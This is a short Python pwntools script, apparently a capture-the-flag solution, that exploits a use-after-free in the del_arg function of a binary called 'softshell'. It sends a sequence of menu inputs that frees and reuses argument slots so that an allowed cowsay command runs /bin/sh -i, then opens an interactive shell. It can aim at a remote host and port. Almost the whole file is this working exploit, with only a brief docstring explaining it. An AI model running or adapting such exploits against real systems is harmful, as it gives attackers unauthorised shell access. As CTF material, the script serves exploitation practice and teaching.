#!/usr/bin/env python3

"""
Utilize a use after free in the del_arg function.
By adding a new command, able to reference the name of
another command and have it use the other command arguments.
"""

from pwn import *


exe = ELF("./softshell_patched")

BINARY = exe.path
context.terminal = ['tmux', 'splitw', '-v']
context.arch = 'amd64'

def conn():
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        r = remote(sys.argv[2].split(':')[0], int(sys.argv[2].split(':')[1]))
    else:
        r = gdb.debug(BINARY, gdbscript = '''
                       b *main
                       c
        ''')

    return r


def main():
    r = conn()

    log.progress("Exploiting")
    # Create our command that is allowed
    payload  = b'1\n/usr/games/cowsay moooo\ntag1\n'
    # Delete the moooo argument
    payload += b'5\n0\n'
    # Replace moooo with -i for interactive
    payload += b'1\n-i\n\n'
    # Delete cowsay argument
    payload += b'5\n0\n'
    # Replace it with /bin/sh
    payload += b'1\n/bin/sh\n\n'
    # Execute the first command
    payload += b'4\n0\n'
    # Send the payload
    r.send(payload)
    # Pop a shell
    r.interactive()

if __name__ == "__main__":
    main()
